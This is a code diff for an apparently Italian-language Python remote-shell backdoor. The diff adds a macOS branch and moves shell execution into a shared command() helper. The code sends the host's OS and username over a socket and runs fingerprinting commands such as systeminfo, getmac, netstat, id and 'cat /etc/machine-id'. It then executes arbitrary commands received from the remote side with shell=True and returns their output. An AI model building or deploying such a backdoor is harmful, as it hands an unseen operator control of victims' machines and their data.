@@ -22,62 +22,78 @@ def connect():
     return serverSocket, connectionSocket
 
 
-
 def setup_windows(connectionSocket):
-    connectionSocket.send("systeminfo".encode(encoding='latin-1'))
-    connectionSocket.send("ipconfig".encode(encoding='latin-1'))
-    connectionSocket.send("getmac".encode(encoding='latin-1'))
-    connectionSocket.send("netstat -p TCP".encode(encoding='latin-1'))
-    connectionSocket.send("netstat -p UDP".encode(encoding='latin-1'))
+
+    connectionSocket.send(command("systeminfo").encode(encoding='latin-1'))
+    connectionSocket.send(command("ipconfig").encode(encoding='latin-1'))
+    connectionSocket.send(command("getmac").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -p TCP").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -p UDP").encode(encoding='latin-1'))
 
 
 
 def setup_linux(connectionSocket):
-    connectionSocket.send("lshw".encode(encoding='latin-1'))
-    connectionSocket.send("lscpu".encode(encoding='latin-1'))
-    connectionSocket.send("ifconfig".encode(encoding='latin-1'))
-    connectionSocket.send("netstat -t".encode(encoding='latin-1'))
-    connectionSocket.send("netstat -u".encode(encoding='latin-1'))
-    connectionSocket.send("id".encode(encoding='latin-1'))
+
+    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))
+    connectionSocket.send(command("cat /etc/machine-id ").encode(encoding='latin-1'))
+    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
+    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
+    connectionSocket.send(command("id").encode(encoding='latin-1'))
+
+
+def setup_mac(connectionSocket):
+
+    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))
+    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
+    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
+    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
+    connectionSocket.send(command("id").encode(encoding='latin-1'))
 
 
 
 def setup(connectionSocket):
 
-    #-----------
 
-    # sys = os.uname() #sistema operativo e tipo di macchina
-    # os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
-    #                     #dell'utente che apre il file)
+    system = platform.system()
+    os.chdir(Path.home())
 
-    # connectionSocket.send(sys.__str__().encode(encoding='latin-1'))
-    # connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
+    connectionSocket.send(system.encode(encoding='latin-1'))
+    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
 
-    # if sys.sysname == "Windows":
-    #    setup_windows(connectionSocket)
 
-    # if sys.sysname == 'Linux': #aggiungere Mac
-    #     setup_Linux(connectionSocket)
-
-    # connectionSocket.send('esc'.encode(encoding='latin-1'))
-
-    #-------------------------
-
-    system = platform.system()###
-    os.chdir(Path.home())###
-
-    connectionSocket.send(system.encode(encoding='latin-1'))###
-
-    if system == 'Windows':###
-        setup_windows(connectionSocket)###
-    elif system == 'Linux':###
-        setup_linux(connectionSocket)###
-    ##da aggiungere macos###
+    if system == 'Windows':
+        setup_windows(connectionSocket)
     
-    connectionSocket.send('esc'.encode(encoding='latin-1'))
+    if system == 'Linux':
+        setup_linux(connectionSocket)
+    
+    if system == 'Darwin':
+        setup_mac(connectionSocket)
+
+    connectionSocket.send("esc".encode(encoding='latin-1'))
     
 
-    
+
+def command(cmd):
+
+    if cmd.startswith("cd") :
+
+        if not((cmd[2:]).isspace() or len(cmd)==2) :
+            os.chdir(cmd[3:])
+        result = os.getcwd()
+
+    else:
+            
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
+
+        if result == '':
+            result = "comando non valido\n"
+
+    return result
+
 
 def main():
     
@@ -94,22 +110,10 @@ def main():
             if cmd == "esc":
                 break
 
-            if cmd.startswith("cd") :
+            result = command(cmd)
 
-                if not((cmd[2:]).isspace() or len(cmd)==2) :
-                    os.chdir(cmd[3:])
-            
-                result = os.getcwd()
-
-            else:
-
-                result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
-
-                if result == '':
-                    result = "comando non valido\n"
-
-        except Exception:
-            result = "Errore: " + Exception.with_traceback()
+        except:
+            result = "Errore\n"
 
         finally:
             connectionSocket.send(result.encode(encoding='latin-1'))
